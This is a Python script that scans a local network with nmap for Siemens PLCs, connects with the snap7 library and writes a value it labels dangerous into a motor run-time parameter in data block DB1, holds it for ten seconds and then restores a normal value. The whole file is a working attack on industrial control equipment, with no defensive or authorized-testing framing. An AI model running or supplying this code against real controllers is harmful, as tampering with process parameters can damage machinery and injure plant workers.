# Import necessary libraries
import snap7
import socket
import struct
import time
import subprocess

# --- CONFIGURATION ---
PLC_RACK = 0  # PLC Rack number
PLC_SLOT = 1  # PLC Slot number
DATA_BLOCK_NUMBER = 1  # Example: DB1 (Change this to your target data block)
START_ADDRESS = 0     # Example: Start at byte 0 within the data block
BYTE_LENGTH = 4        # Example: Modify a 4-byte REAL (float) value
TARGET_PARAMETER_NAME = "Motor_Run_Time"  # Descriptive name of the parameter being modified
DANGEROUS_VALUE = 3600.0 # Example: A dangerous motor run time (1 hour)
NORMAL_VALUE = 60.0   # Example:  A normal motor run time (1 minute)
SLEEP_TIME = 10  # seconds between setting to dangerous value and back to normal

def get_plc_ip_address():
    """
    Attempts to discover the PLC's IP address by scanning the network.
    This is a simplified approach and may not work in all network configurations.
    Consider using a more robust discovery method for production environments.

    Returns:
        str: The PLC's IP address if found, None otherwise.
    """
    try:
        # Using nmap to scan the network for devices
        # Replace '192.168.1.0/24' with your network range if necessary.
        result = subprocess.run(['nmap', '-sn', '192.168.1.0/24'], capture_output=True, text=True)
        output = result.stdout

        # Parse the nmap output to find potential PLC IP addresses.
        # This part is VERY reliant on the structure of nmap's output and may
        # need adjustment based on your nmap version and network devices.
        lines = output.splitlines()
        for line in lines:
            if "PLC" in line or "Siemens" in line:  # Adjust keywords as needed
                if "Nmap scan report for" in line:
                    ip_address = line.split("Nmap scan report for ")[1].strip()
                    print(f"Potential PLC IP address found: {ip_address}")
                    return ip_address

        print("PLC IP address not found using nmap.")
        return None

    except FileNotFoundError:
        print("Nmap not found. Please ensure nmap is installed and in your system's PATH.")
        return None
    except Exception as e:
        print(f"An error occurred during IP discovery: {e}")
        return None


def write_real_to_plc(plc_client, db_number, start_address, value):
    """
    Writes a REAL (float) value to the PLC at the specified data block, start address.

    Args:
        plc_client:  The snap7 PLC client object.
        db_number: The data block number.
        start_address: The starting byte address within the data block.
        value: The REAL (float) value to write.
    """
    try:
        # Create a byte array to hold the REAL value.  snap7 uses a byte array.
        data = bytearray(struct.pack(">f", value))  # ">f" for big-endian float

        # Write the data to the PLC
        plc_client.db_write(db_number, start_address, data)
        print(f"Successfully wrote value {value} to DB{db_number}.DBB{start_address} ({TARGET_PARAMETER_NAME}).")

    except Exception as e:
        print(f"Error writing to PLC: {e}")


def main():
    """
    Main function to connect to the PLC, modify a parameter, and then restore it.
    """
    plc_ip = get_plc_ip_address()

    if not plc_ip:
        print("Failed to find PLC IP address.  Exiting.")
        return

    plc = snap7.client.Client()

    try:
        plc.connect(plc_ip, PLC_RACK, PLC_SLOT)
        print(f"Successfully connected to PLC at {plc_ip}.")

        # --- Modify the parameter ---
        print(f"Setting {TARGET_PARAMETER_NAME} to dangerous value: {DANGEROUS_VALUE}")
        write_real_to_plc(plc, DATA_BLOCK_NUMBER, START_ADDRESS, DANGEROUS_VALUE)
        time.sleep(SLEEP_TIME) # Hold dangerous value for a specified time

        # --- Restore the parameter ---
        print(f"Restoring {TARGET_PARAMETER_NAME} to normal value: {NORMAL_VALUE}")
        write_real_to_plc(plc, DATA_BLOCK_NUMBER, START_ADDRESS, NORMAL_VALUE)


    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")


if __name__ == "__main__":
    main()